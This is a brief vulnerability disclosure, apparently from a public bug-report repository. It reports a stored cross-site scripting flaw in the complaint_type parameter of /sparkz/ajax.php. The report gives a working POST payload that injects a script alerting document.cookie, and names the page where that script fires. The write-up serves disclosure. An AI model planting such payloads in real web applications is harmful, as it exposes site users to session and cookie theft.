BUG_Author: getshell

Vulnerability url: /sparkz/ajax.php

POST parameter complaint_type exists stored cross-site scripting

Payload:complainant_name=1&complaint_type=<script>alert(document.cookie)</script>&complaint=2&createComplaint=

![image](https://github.com/admin-passwd/bug_report/blob/main/sql1.png)

Payload will trigger when a user visits on http://localhost/sparkz/index.php?complain

![image](https://github.com/admin-passwd/bug_report/blob/main/sql2.png)
